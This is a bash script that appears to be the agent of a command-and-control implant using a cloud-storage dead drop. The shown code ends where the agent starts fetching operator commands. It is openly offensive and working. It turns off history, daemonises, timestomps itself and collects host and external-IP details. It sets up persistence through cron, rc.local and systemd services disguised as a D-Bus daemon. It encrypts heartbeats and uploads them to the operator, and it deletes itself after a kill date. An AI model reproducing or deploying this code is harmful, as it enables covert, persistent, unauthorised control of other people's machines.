# === DEBUG (compile-time, set by wizard) ===
STUB_DBG_INIT

# === DAEMON MODE (DETACH) ===
DAEMON_MODE=0
if [ "$1" = "-d" ] || [ "$2" = "-d" ] || [ "$3" = "-d" ]; then
    DAEMON_MODE=1
fi

# === ANTI-FORENSIC MEASURES ===
# 1. Disable bash history
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# 3. If daemon mode requested, detach completely (skipped in verbose/debug mode)
if [ $DAEMON_MODE -eq 1 ] && [ "$1" != "--daemonized" ] && [ "$VERBOSE_MODE" != "1" ]; then
    log "[DAEMON]: Starting daemon mode (complete detach)..."

    # Build arguments
    DAEMON_ARGS="--daemonized"

    # Try setsid (preferred), fallback nohup
    if command -v setsid >/dev/null 2>&1; then
        setsid bash "$0" $DAEMON_ARGS </dev/null >/dev/null 2>&1 &
        PID=$!
    else
        nohup bash "$0" $DAEMON_ARGS </dev/null >/dev/null 2>&1 &
        PID=$!
    fi

    disown 2>/dev/null || true
    log "[DAEMON]: Agent started in background (PID: $PID)"
    exit 0
fi

# 4. Trap for automatic cleanup on exit
cleanup() {
    log "[CLEANUP]: Memory cleanup in progress..." >&2
    
    _transport_cleanup
    unset PUBLIC_KEY PK1 PK2 PK3 PK4 SESSION_KEY
    unset aes_key aes_iv aes_key_out aes_iv_out
    unset command_to_run _output _response encrypted_input encrypted_output
    unset encrypted_command encrypted_result encrypted_aes_key
    unset aes_credentials aes_credentials_out

    log "[CLEANUP]: Memory cleaned" >&2
}

trap cleanup EXIT TERM


# === RSA PUBLIC KEY (split and obfuscated) ===
PK1="PLACEHOLDER_PK1"
PK2="PLACEHOLDER_PK2"
PK3="PLACEHOLDER_PK3"
PK4="PLACEHOLDER_PK4"

PUBLIC_KEY=$(echo "${PK1}${PK2}${PK3}${PK4}" | base64 -d)
unset PK1 PK2 PK3 PK4

# === SESSION KEY (pre-shared; GCM-wraps aes_key in server→agent commands) ===
# For staged-enc deployments, _SS_K is injected by the stub after decrypting stage2.
SESSION_KEY="${_SS_K:-PLACEHOLDER_SESSION_KEY}"
unset _SS_K

# === DROPBOX CONFIGURATION ===
FOLDER_PATH="PLACEHOLDER_FOLDER_PATH"
INPUT_FILE="PLACEHOLDER_INPUT_FILE"
OUTPUT_FILE="PLACEHOLDER_OUTPUT_FILE"
HEARTBEAT_FILE="PLACEHOLDER_HEARTBEAT_FILE"
STAGING_PATH="$FOLDER_PATH/staging"

# === STUB BLOB PATH (wiped on EXIT for clean shutdown) ===
_BLOB_PATH="PLACEHOLDER_BLOB_PATH"

# === SLEEP CONFIGURATION ===
BASE_SLEEP=PLACEHOLDER_BASE_SLEEP
JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT
JITTER=$((BASE_SLEEP * JITTER_PERCENT / 100))

log "[CONFIG]: Base sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"

# === KILL DATE GUARDRAIL ===
KILL_DATE="PLACEHOLDER_KILL_DATE"

_kill_date_check() {
    [ -z "$KILL_DATE" ] && return 1
    local today
    today=$(date +%Y-%m-%d 2>/dev/null) || return 1
    [ "$today" = "$KILL_DATE" ] || [[ "$today" > "$KILL_DATE" ]]
}

_self_destruct() {
    log "[KILL DATE]: expiry reached — removing persist and self"
    persist_remove 2>/dev/null || true
    rm -f "$_BLOB_PATH" 2>/dev/null || true
    rm -f "$0" 2>/dev/null || true
    exit 0
}

# === GENERATE INITIAL TOKEN ===
# S3 and other Sig V4 transports sign each request individually — no token refresh needed.
if command -v _token_refresh >/dev/null 2>&1; then
    _token_refresh || exit 1
fi

# === GATHER SYSTEM INFO (once at startup) ===
SYS_HOSTNAME=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "unknown")
SYS_USER=$(whoami 2>/dev/null || echo "unknown")
SYS_IP=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | head -1)
[ -z "$SYS_IP" ] && SYS_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$SYS_IP" ] && SYS_IP=$(ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
[ -z "$SYS_IP" ] && SYS_IP="unknown"
SYS_IP_EXT=$(
    # 1. Direct public IP on interface
    _r=$(ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | \
         grep -vE '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|169\.254\.)' | head -1)
    [ -n "$_r" ] && { printf '%s' "$_r"; exit; }
    # 2. STUN (RFC 5389, pure UDP/19302, works through NAT, immune to DNS proxies)
    _r=$(python3 -c "
import socket,os
p=b'\x00\x01\x00\x00\x21\x12\xa4\x42'+os.urandom(12)
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(p,('PLACEHOLDER_STUN_IP',19302))
r,_=s.recvfrom(1024);s.close()
i=20
while i+4<=len(r):
 at=(r[i]<<8)|r[i+1];al=(r[i+2]<<8)|r[i+3]
 if at==0x0020 and al>=8 and r[i+5]==1:
  print('.'.join(str(r[i+8+j]^[0x21,0x12,0xa4,0x42][j])for j in range(4)));break
 i+=4+al+(4-al%4 if al%4 else 0)
" 2>/dev/null)
    [ -n "$_r" ] && { printf '%s' "$_r"; exit; }
    # 3. Google TXT fallback (-4 forces IPv4 transport → returns IPv4 external)
    _r=$(dig -4 +short txt o-o.myaddr.l.google.com @8.8.8.8 +time=3 +tries=1 2>/dev/null | tr -d '"' | head -1)
    [ -n "$_r" ] && { printf '%s' "$_r"; exit; }
    # 4. Cloudflare TXT fallback
    _r=$(dig -4 whoami.cloudflare ch txt @1.1.1.1 +short +time=3 +tries=1 2>/dev/null | tr -d '"' | head -1)
    [ -n "$_r" ] && { printf '%s' "$_r"; exit; }
    printf ''
)
SYS_OS=$(uname -sr 2>/dev/null || echo "unknown")
SYS_PRIVS="user"
[ "$(id -u 2>/dev/null)" = "0" ] && SYS_PRIVS="root"
SYS_DOMAIN=$(realm list 2>/dev/null | awk '/domain-name/{print $2; exit}')
[ -z "$SYS_DOMAIN" ] && SYS_DOMAIN=$(net ads info 2>/dev/null | awk '/^Realm:/{print $2; exit}')
AGENT_START_CWD="$(pwd)"
OPERATOR_CWD="$(pwd)"
AGENT_PID=$$
AGENT_PROC=$(cat /proc/$$/comm 2>/dev/null | tr -d '\n' || basename "$0" 2>/dev/null || echo "bash")
_HB_SEQ=0

# Self-timestomp: align stub file timestamps with neighboring files to defeat age-based forensics
if [ -n "$STUB_PATH" ] && [ -f "$STUB_PATH" ]; then
    _ref=$(ls -t "$(dirname "$STUB_PATH")" 2>/dev/null | grep -v "^$(basename "$STUB_PATH")$" | head -1)
    if [ -n "$_ref" ]; then
        touch -r "$(dirname "$STUB_PATH")/$_ref" "$STUB_PATH" 2>/dev/null
    else
        touch -r /bin/bash "$STUB_PATH" 2>/dev/null
    fi
fi

log "[SYSINFO]: $SYS_HOSTNAME | $SYS_USER ($SYS_PRIVS) | $SYS_IP | $SYS_OS"

# ============================================================
# PERSISTENCE ENGINE — multi-technique, modular
# All techniques deploy to the same stealthy binary path.
# ============================================================
_PERSIST_DIR="$HOME/PLACEHOLDER_PERSIST_SUFFIX"
_PERSIST_PAYLOAD="$_PERSIST_DIR/PLACEHOLDER_PERSIST_PAYLOAD"
_PERSIST_CRON_MARKER="PLACEHOLDER_CRON_COMMENT"
_PERSIST_SVC="PLACEHOLDER_PERSIST_SVC"
_PERSIST_RC_MARKER="PLACEHOLDER_RC_COMMENT"
_NL=$'\n'

# Copy stub to stealthy deploy path if not already there; prints path on success
_persist_ensure_binary() {
    local _src
    # Priority: explicit stub path → $0
    if [ -n "$STUB_PATH" ] && [ -f "$STUB_PATH" ]; then
        _src="$STUB_PATH"
    elif [ -f "$0" ]; then
        _src="$0"
    else
        printf 'ERROR: Cannot locate agent binary to persist (STUB_PATH=%s not found, $0=%s not a file)' "$STUB_PATH" "$0"
        return 1
    fi
    mkdir -p "$_PERSIST_DIR" 2>/dev/null
    if ! [ -f "$_PERSIST_PAYLOAD" ]; then
        cp "$_src" "$_PERSIST_PAYLOAD" 2>/dev/null || { printf 'ERROR: cp failed'; return 1; }
        chmod +x "$_PERSIST_PAYLOAD"
        touch -r /bin/bash "$_PERSIST_PAYLOAD" 2>/dev/null
        touch -r /bin/bash "$_PERSIST_DIR" 2>/dev/null
    fi
    printf '%s' "$_PERSIST_PAYLOAD"
}

# ── Technique: cron-reboot ────────────────────────────────────
# User @reboot crontab entry (user-priv, boot trigger)
_probe_cron_reboot() {
    local _cron _c=0 _f=0 _st
    _cron=$(crontab -l 2>/dev/null || true)
    echo "$_cron" | grep -qF "$_PERSIST_CRON_MARKER" && _c=1
    [ -f "$_PERSIST_PAYLOAD" ] && _f=1
    if [ $_c -eq 1 ] && [ $_f -eq 1 ]; then _st="installed"
    elif [ $_c -eq 1 ] || [ $_f -eq 1 ]; then _st="partial"
    else _st="available"; fi
    printf 'PROBE:cron-reboot:%s:user:User crontab @reboot — fires at every system boot\n' "$_st"
}
_install_cron_reboot() {
    local _p _cron
    _p=$(_persist_ensure_binary) || { printf '%s
' "$_p"; return; }
    _cron=$(crontab -l 2>/dev/null || true)
    if echo "$_cron" | grep -qF "$_PERSIST_CRON_MARKER"; then
        printf '%s\n' "OK: cron-reboot already installed"
    else
        printf '%s\n@reboot %s %s\n' "$_cron" "$_p" "$_PERSIST_CRON_MARKER" | crontab -
        if [ $? -eq 0 ]; then
            printf '%s\n' "OK: cron-reboot installed${_NL}  Payload: $_p${_NL}  Trigger: @reboot (user crontab)${_NL}ARTIFACT:persist_payload:$_p${_NL}ARTIFACT:persist_cron:@reboot $_p"
        else
            printf '%s\n' "ERROR: cron-reboot — failed to write crontab"
        fi
    fi
}
_remove_cron_reboot() {
    local _cron
    _cron=$(crontab -l 2>/dev/null || true)
    printf '%s\n' "$_cron" | grep -vF "$_PERSIST_CRON_MARKER" | crontab - 2>/dev/null || true
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
    printf '%s\n' "OK: cron-reboot removed${_NL}ARTIFACT_REMOVED:persist_payload:$_PERSIST_PAYLOAD${_NL}ARTIFACT_REMOVED:persist_cron:@reboot $_PERSIST_PAYLOAD"
}
_status_cron_reboot() {
    local _cron _c=0 _f=0
    _cron=$(crontab -l 2>/dev/null || true)
    echo "$_cron" | grep -qF "$_PERSIST_CRON_MARKER" && _c=1
    [ -f "$_PERSIST_PAYLOAD" ] && _f=1
    if [ $_c -eq 1 ] && [ $_f -eq 1 ]; then
        printf '%s\n' "ACTIVE: cron-reboot${_NL}  Cron: @reboot entry present${_NL}  Payload: $_PERSIST_PAYLOAD (exists)"
    elif [ $_c -eq 1 ]; then
        printf '%s\n' "PARTIAL: cron-reboot — cron entry present but payload missing"
    elif [ $_f -eq 1 ]; then
        printf '%s\n' "PARTIAL: cron-reboot — payload exists but no cron entry"
    else
        printf '%s\n' "NOT INSTALLED: cron-reboot"
    fi
}

# ── Technique: systemd-user ───────────────────────────────────
# ~/.config/systemd/user/ service (user-priv; linger needed for true boot trigger)
_probe_systemd_user() {
    local _svcfile="$HOME/.config/systemd/user/${_PERSIST_SVC}.service"
    local _f=0 _en=0 _st _linger_note=""
    [ -f "$_svcfile" ] && _f=1
    systemctl --user is-enabled "$_PERSIST_SVC" 2>/dev/null | grep -q "^enabled" && _en=1
    if [ $_f -eq 1 ] && [ $_en -eq 1 ]; then _st="installed"
    elif [ $_f -eq 1 ] || [ $_en -eq 1 ]; then _st="partial"
    else _st="available"; fi
    loginctl show-user "$USER" 2>/dev/null | grep -q "^Linger=yes" || _linger_note=" (linger off: logon-only)"
    printf 'PROBE:systemd-user:%s:user:systemd user service%s\n' "$_st" "$_linger_note"
}
_install_systemd_user() {
    local _p _svcdir="$HOME/.config/systemd/user" _svcfile
    _svcfile="$_svcdir/${_PERSIST_SVC}.service"
    _p=$(_persist_ensure_binary) || { printf '%s
' "$_p"; return; }
    mkdir -p "$_svcdir" 2>/dev/null
    printf '[Unit]\nDescription=D-Bus Notification Daemon\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=%s\nRestart=on-failure\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n' "$_p" > "$_svcfile"
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$_PERSIST_SVC" 2>/dev/null
    local _linger_note
    loginctl enable-linger "$USER" 2>/dev/null \
        && _linger_note="${_NL}  Linger: enabled — fires at boot" \
        || _linger_note="${_NL}  WARN: loginctl enable-linger requires root — fires at logon only"
    printf '%s\n' "OK: systemd-user installed${_NL}  Service: $_svcfile${_NL}  Payload: $_p${_linger_note}${_NL}ARTIFACT:persist_payload:$_p${_NL}ARTIFACT:persist_svc:$_svcfile"
}
_remove_systemd_user() {
    local _svcfile="$HOME/.config/systemd/user/${_PERSIST_SVC}.service"
    systemctl --user stop "$_PERSIST_SVC" 2>/dev/null || true
    systemctl --user disable "$_PERSIST_SVC" 2>/dev/null || true
    rm -f "$_svcfile" 2>/dev/null
    systemctl --user daemon-reload 2>/dev/null
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
    printf '%s\n' "OK: systemd-user removed${_NL}ARTIFACT_REMOVED:persist_payload:$_PERSIST_PAYLOAD${_NL}ARTIFACT_REMOVED:persist_svc:$_svcfile"
}
_status_systemd_user() {
    local _svcfile="$HOME/.config/systemd/user/${_PERSIST_SVC}.service"
    local _f=0 _en=0
    [ -f "$_svcfile" ] && _f=1
    systemctl --user is-enabled "$_PERSIST_SVC" 2>/dev/null | grep -q "^enabled" && _en=1
    if [ $_f -eq 1 ] && [ $_en -eq 1 ]; then
        printf '%s\n' "ACTIVE: systemd-user${_NL}  Service: $_svcfile${_NL}  Enabled: yes"
    elif [ $_f -eq 1 ]; then
        printf '%s\n' "PARTIAL: systemd-user — service file present but not enabled"
    elif [ $_en -eq 1 ]; then
        printf '%s\n' "PARTIAL: systemd-user — enabled but service file missing"
    else
        printf '%s\n' "NOT INSTALLED: systemd-user"
    fi
}

# ── Technique: systemd-system ─────────────────────────────────
# /etc/systemd/system/ service (root only, boot trigger)
_probe_systemd_system() {
    if [ "$(id -u)" != "0" ]; then
        printf 'PROBE:systemd-system:unavailable:root:Requires root — /etc/systemd/system/ service\n'; return
    fi
    local _svcfile="/etc/systemd/system/${_PERSIST_SVC}.service"
    local _f=0 _en=0 _st
    [ -f "$_svcfile" ] && _f=1
    systemctl is-enabled "$_PERSIST_SVC" 2>/dev/null | grep -q "^enabled" && _en=1
    if [ $_f -eq 1 ] && [ $_en -eq 1 ]; then _st="installed"
    elif [ $_f -eq 1 ] || [ $_en -eq 1 ]; then _st="partial"
    else _st="available"; fi
    printf 'PROBE:systemd-system:%s:root:System-wide systemd service — fires at boot\n' "$_st"
}
_install_systemd_system() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: systemd-system requires root"; return; fi
    local _p _svcfile="/etc/systemd/system/${_PERSIST_SVC}.service"
    _p=$(_persist_ensure_binary) || { printf '%s
' "$_p"; return; }
    printf '[Unit]\nDescription=D-Bus Notification Daemon\nAfter=network.target\n\n[Service]\nType=simple\nUser=%s\nExecStart=%s\nRestart=on-failure\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n' "$USER" "$_p" > "$_svcfile"
    systemctl daemon-reload 2>/dev/null
    systemctl enable "$_PERSIST_SVC" 2>/dev/null
    printf '%s\n' "OK: systemd-system installed${_NL}  Service: $_svcfile${_NL}  User: $USER${_NL}  Payload: $_p${_NL}  Trigger: boot (multi-user.target)${_NL}ARTIFACT:persist_payload:$_p${_NL}ARTIFACT:persist_svc:$_svcfile"
}
_remove_systemd_system() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: systemd-system requires root"; return; fi
    local _svcfile="/etc/systemd/system/${_PERSIST_SVC}.service"
    if systemctl cat "$_PERSIST_SVC" >/dev/null 2>&1; then
        systemctl stop "$_PERSIST_SVC" 2>/dev/null || true
        systemctl disable "$_PERSIST_SVC" 2>/dev/null || true
    fi
    rm -f "$_svcfile" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
    printf '%s\n' "OK: systemd-system removed${_NL}ARTIFACT_REMOVED:persist_payload:$_PERSIST_PAYLOAD${_NL}ARTIFACT_REMOVED:persist_svc:$_svcfile"
}
_status_systemd_system() {
    local _svcfile="/etc/systemd/system/${_PERSIST_SVC}.service"
    local _f=0 _en=0
    [ -f "$_svcfile" ] && _f=1
    systemctl is-enabled "$_PERSIST_SVC" 2>/dev/null | grep -q "^enabled" && _en=1
    if [ $_f -eq 1 ] && [ $_en -eq 1 ]; then
        printf '%s\n' "ACTIVE: systemd-system${_NL}  Service: $_svcfile${_NL}  Enabled: yes"
    elif [ $_f -eq 1 ]; then
        printf '%s\n' "PARTIAL: systemd-system — service file present but not enabled"
    elif [ $_en -eq 1 ]; then
        printf '%s\n' "PARTIAL: systemd-system — enabled but service file missing"
    else
        printf '%s\n' "NOT INSTALLED: systemd-system"
    fi
}

# ── Technique: rc-local ───────────────────────────────────────
# /etc/rc.local injection (root only, boot trigger)
_probe_rc_local() {
    if [ "$(id -u)" != "0" ]; then
        printf 'PROBE:rc-local:unavailable:root:Requires root — /etc/rc.local injection\n'; return
    fi
    if grep -qF "$_PERSIST_RC_MARKER" /etc/rc.local 2>/dev/null; then
        printf 'PROBE:rc-local:installed:root:/etc/rc.local injection — fires at boot\n'
    elif [ -f /etc/rc.local ]; then
        printf 'PROBE:rc-local:available:root:/etc/rc.local injection — fires at boot\n'
    else
        printf 'PROBE:rc-local:unavailable:root:/etc/rc.local not present on this system\n'
    fi
}
_install_rc_local() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: rc-local requires root"; return; fi
    local _p
    _p=$(_persist_ensure_binary) || { printf '%s
' "$_p"; return; }
    if ! [ -f /etc/rc.local ]; then
        printf '#!/bin/bash\n# rc.local\nexit 0\n' > /etc/rc.local
        chmod +x /etc/rc.local
    fi
    if grep -qF "$_PERSIST_RC_MARKER" /etc/rc.local; then
        printf '%s\n' "OK: rc-local already installed"
    else
        if grep -q '^exit 0' /etc/rc.local; then
            sed -i "/^exit 0/i $_p $_PERSIST_RC_MARKER" /etc/rc.local
        else
            printf '%s %s\n' "$_p" "$_PERSIST_RC_MARKER" >> /etc/rc.local
        fi
        printf '%s\n' "OK: rc-local installed${_NL}  Payload: $_p${_NL}  Trigger: /etc/rc.local (boot)${_NL}ARTIFACT:persist_payload:$_p"
    fi
}
_remove_rc_local() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: rc-local requires root"; return; fi
    [ -f /etc/rc.local ] && sed -i "/.*$_PERSIST_RC_MARKER/d" /etc/rc.local 2>/dev/null || true
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
    printf '%s\n' "OK: rc-local removed${_NL}ARTIFACT_REMOVED:persist_payload:$_PERSIST_PAYLOAD"
}
_status_rc_local() {
    if grep -qF "$_PERSIST_RC_MARKER" /etc/rc.local 2>/dev/null; then
        printf '%s\n' "ACTIVE: rc-local${_NL}  Entry in /etc/rc.local present${_NL}  Payload: $_PERSIST_PAYLOAD"
    elif [ -f "$_PERSIST_PAYLOAD" ]; then
        printf '%s\n' "PARTIAL: rc-local — payload exists but not in /etc/rc.local"
    else
        printf '%s\n' "NOT INSTALLED: rc-local"
    fi
}

# ── Technique: cron-system ────────────────────────────────────
# Root crontab @reboot entry (root only, boot trigger)
_probe_cron_system() {
    if [ "$(id -u)" != "0" ]; then
        printf 'PROBE:cron-system:unavailable:root:Requires root — root crontab @reboot\n'; return
    fi
    if crontab -u root -l 2>/dev/null | grep -qF "$_PERSIST_CRON_MARKER"; then
        printf 'PROBE:cron-system:installed:root:Root crontab @reboot — fires at boot\n'
    else
        printf 'PROBE:cron-system:available:root:Root crontab @reboot — fires at boot\n'
    fi
}
_install_cron_system() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: cron-system requires root"; return; fi
    local _p _cron
    _p=$(_persist_ensure_binary) || { printf '%s
' "$_p"; return; }
    _cron=$(crontab -u root -l 2>/dev/null || true)
    if echo "$_cron" | grep -qF "$_PERSIST_CRON_MARKER"; then
        printf '%s\n' "OK: cron-system already installed"
    else
        printf '%s\n@reboot %s %s\n' "$_cron" "$_p" "$_PERSIST_CRON_MARKER" | crontab -u root -
        if [ $? -eq 0 ]; then
            printf '%s\n' "OK: cron-system installed${_NL}  Payload: $_p${_NL}  Trigger: root @reboot${_NL}ARTIFACT:persist_payload:$_p"
        else
            printf '%s\n' "ERROR: cron-system — failed to write root crontab"
        fi
    fi
}
_remove_cron_system() {
    if [ "$(id -u)" != "0" ]; then printf '%s\\n' "ERROR: cron-system requires root"; return; fi
    local _cron
    _cron=$(crontab -u root -l 2>/dev/null || true)
    printf '%s\n' "$_cron" | grep -vF "$_PERSIST_CRON_MARKER" | crontab -u root - 2>/dev/null || true
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
    printf '%s\n' "OK: cron-system removed${_NL}ARTIFACT_REMOVED:persist_payload:$_PERSIST_PAYLOAD"
}
_status_cron_system() {
    if crontab -u root -l 2>/dev/null | grep -qF "$_PERSIST_CRON_MARKER"; then
        printf '%s\n' "ACTIVE: cron-system${_NL}  Root @reboot entry present${_NL}  Payload: $_PERSIST_PAYLOAD"
    else
        printf '%s\n' "NOT INSTALLED: cron-system"
    fi
}

# ── Probe all techniques ──────────────────────────────────────
_persist_probe_all() {
    local _r=""
    _r+="$(_probe_cron_reboot)${_NL}"
    _r+="$(_probe_systemd_user)${_NL}"
    _r+="$(_probe_systemd_system)${_NL}"
    _r+="$(_probe_rc_local)${_NL}"
    _r+="$(_probe_cron_system)${_NL}"
    printf '%s\n' "PERSIST_PROBE_RESULT${_NL}${_r}"
}

# ── Remove ALL installed techniques (used by KILL) ────────────
_persist_remove_all() {
    local _cron
    _cron=$(crontab -l 2>/dev/null || true)
    printf '%s\n' "$_cron" | grep -vF "$_PERSIST_CRON_MARKER" | crontab - 2>/dev/null || true
    local _usvc="$HOME/.config/systemd/user/${_PERSIST_SVC}.service"
    if systemctl --user cat "$_PERSIST_SVC" >/dev/null 2>&1; then
        systemctl --user stop "$_PERSIST_SVC" 2>/dev/null || true
        systemctl --user disable "$_PERSIST_SVC" 2>/dev/null || true
    fi
    rm -f "$_usvc" 2>/dev/null
    systemctl --user daemon-reload 2>/dev/null || true
    if [ "$(id -u)" = "0" ]; then
        local _ssvc="/etc/systemd/system/${_PERSIST_SVC}.service"
        if systemctl cat "$_PERSIST_SVC" >/dev/null 2>&1; then
            systemctl stop "$_PERSIST_SVC" 2>/dev/null || true
            systemctl disable "$_PERSIST_SVC" 2>/dev/null || true
        fi
        rm -f "$_ssvc" 2>/dev/null
        systemctl daemon-reload 2>/dev/null || true
        [ -f /etc/rc.local ] && sed -i "/.*$_PERSIST_RC_MARKER/d" /etc/rc.local 2>/dev/null || true
        local _rcron
        _rcron=$(crontab -u root -l 2>/dev/null || true)
        printf '%s\n' "$_rcron" | grep -vF "$_PERSIST_CRON_MARKER" | crontab -u root - 2>/dev/null || true
    fi
    rm -f "$_PERSIST_PAYLOAD" 2>/dev/null
    rm -rf "$_PERSIST_DIR" 2>/dev/null
}

# === JSON DEPENDENCY CHECK ===
_jq_ok=0
_py_ok=0
command -v jq      >/dev/null 2>&1 && _jq_ok=1
command -v python3 >/dev/null 2>&1 && _py_ok=1
if [ $_jq_ok -eq 0 ] && [ $_py_ok -eq 0 ]; then
    log "[FATAL]: Neither jq nor python3 available — cannot parse JSON tasks. Exiting."
    exit 1
fi

# Encode a string as a JSON string value (with surrounding quotes).
_json_str() {
    if [ $_jq_ok -eq 1 ]; then
        printf '%s' "$1" | tr -d '\0' | jq -Rs .
    else
        printf '%s' "$1" | tr -d '\0' | python3 -c "import json,sys; print(json.dumps(sys.stdin.read()))"
    fi
}

# Build a full response JSON object.
# Args: id type status output cwd staging_path [artifacts_json] [session_token]
_json_response() {
    local _id="$1" _type="$2" _st="$3" _out="$4" _cwd="$5" _sp="$6"
    local _arts="${7:-[]}" _tok="${8:-}"
    local _oe _ce _se
    _oe=$(_json_str "$_out")
    _ce=$(_json_str "$_cwd")
    _se=$(_json_str "$_sp")
    if [ -n "$_tok" ]; then
        printf '{"id":"%s","type":"%s","status":"%s","output":%s,"cwd":%s,"staging_path":%s,"artifacts":%s,"session_token":"%s"}' \
            "$_id" "$_type" "$_st" "$_oe" "$_ce" "$_se" "$_arts" "$_tok"
    else
        printf '{"id":"%s","type":"%s","status":"%s","output":%s,"cwd":%s,"staging_path":%s,"artifacts":%s}' \
            "$_id" "$_type" "$_st" "$_oe" "$_ce" "$_se" "$_arts"
    fi
}

# Extract ARTIFACT:/ARTIFACT_REMOVED: marker lines from output text.
# Prints (clean_output, artifacts_json) to stdout separated by a NUL byte — use with _split_artifacts.
# Usage: _parsed=$(_extract_artifacts "$raw_output"); _clean=${_parsed%%$'\x01'*}; _arts=${_parsed##*$'\x01'}
_extract_artifacts() {
    local _raw="$1" _clean="" _arts="[]" _arr="" _line _rest _kind _path _first=1
    while IFS= read -r _line; do
        case "$_line" in
            ARTIFACT_REMOVED:*)
                _rest="${_line#ARTIFACT_REMOVED:}"
                _kind="${_rest%%:*}"; _path="${_rest#*:}"
                if [ -n "$_kind" ] && [ -n "$_path" ]; then
                    _kj=$(_json_str "$_kind"); _pj=$(_json_str "$_path")
                    if [ $_first -eq 1 ]; then _arr="{\"op\":\"remove\",\"type\":${_kj},\"path\":${_pj}}"; _first=0
                    else _arr="${_arr},{\"op\":\"remove\",\"type\":${_kj},\"path\":${_pj}}"; fi
                fi ;;
            ARTIFACT:*)
                _rest="${_line#ARTIFACT:}"
                _kind="${_rest%%:*}"; _path="${_rest#*:}"
                if [ -n "$_kind" ] && [ -n "$_path" ]; then
                    _kj=$(_json_str "$_kind"); _pj=$(_json_str "$_path")
                    if [ $_first -eq 1 ]; then _arr="{\"op\":\"add\",\"type\":${_kj},\"path\":${_pj}}"; _first=0
                    else _arr="${_arr},{\"op\":\"add\",\"type\":${_kj},\"path\":${_pj}}"; fi
                fi ;;
            *)
                if [ -z "$_clean" ]; then _clean="$_line"
                else _clean="${_clean}
${_line}"; fi ;;
        esac
    done <<EOF
$_raw
EOF
    [ -n "$_arr" ] && _arts="[${_arr}]"
    printf '%s\x01%s' "$_clean" "$_arts"
}

# Parse a field from the task JSON.
_task_field() {
    local _json="$1" _key="$2"
    if [ $_jq_ok -eq 1 ]; then
        printf '%s' "$_json" | jq -r ".${_key} // empty"
    else
        printf '%s' "$_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('${_key}','') or '')"
    fi
}

# Parse a nested args field from the task JSON.
_task_arg() {
    local _json="$1" _key="$2"
    if [ $_jq_ok -eq 1 ]; then
        printf '%s' "$_json" | jq -r ".args.${_key} // empty"
    else
        printf '%s' "$_json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('args',{}).get('${_key}','') or '')"
    fi
}

# === INFINITE LOOP ===
while true; do
    _kill_date_check && _self_destruct

    _rnd=$(od -An -N2 -tu2 /dev/urandom | tr -d ' ')
    sleep_time=$(( BASE_SLEEP - JITTER + (_rnd % (JITTER * 2 + 1)) ))

    log ""
    log "========================================="
    log "=== CYCLE START ==="
    log "========================================="
    
    # === HEARTBEAT UPDATE ===
    log "[HEARTBEAT]: Updating timestamp..."
    timestamp=$(date +%s)
    _HB_SEQ=$(( _HB_SEQ + 1 ))
    if [ -n "$_BLOB_PATH" ] && [ -f "$_BLOB_PATH" ]; then SYS_BLOB="$_BLOB_PATH"; else SYS_BLOB=""; fi
    heartbeat_data="${timestamp}|${SYS_HOSTNAME}|${SYS_USER}|${SYS_IP}|${SYS_OS}|${SYS_PRIVS}|${AGENT_START_CWD}|${OPERATOR_CWD}|${SYS_IP_EXT}|${AGENT_PID}|${AGENT_PROC}|${SYS_DOMAIN}|${SYS_BLOB}|${_BLOB_TRIED:-}|${_HB_SEQ}"
    
    # Encrypt heartbeat — RSA-OAEP-SHA256 + AES-256-GCM (agente→server)
    # aes_key sealed with server public key (only server can decrypt)
    heartbeat_payload=$(python3 -c "
import sys, os, base64
from cryptography.hazmat.primitives.asymmetric import padding as _p
from cryptography.hazmat.primitives import hashes as _h
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
_oaep = _p.OAEP(mgf=_p.MGF1(_h.SHA256()), algorithm=_h.SHA256(), label=None)
pub  = load_pem_public_key('''$PUBLIC_KEY'''.encode())
data = sys.stdin.buffer.read()
k = os.urandom(32); n = os.urandom(12)
blob    = n + AESGCM(k).encrypt(n, data, None)
wrapped = pub.encrypt(k, _oaep)
print(base64.b64encode(wrapped).decode() + ':' + base64.b64encode(blob).decode(), end='')
" <<< "$heartbeat_data" 2>/dev/null)
    if [ -z "$heartbeat_payload" ]; then
        log "[HEARTBEAT]: [!] Encryption failed — skipping cycle"
        unset heartbeat_data
        sleep "$sleep_time"
        continue
    fi

    echo -n "$heartbeat_payload" | _upload "${FOLDER_PATH}${HEARTBEAT_FILE}"
    
    unset heartbeat_payload
    log "[HEARTBEAT]: [OK] Timestamp: $timestamp"
    
    # === DOWNLOAD ENCRYPTED COMMAND ===
    log ""
    log "[INPUT]: Downloading encrypted command..."
    
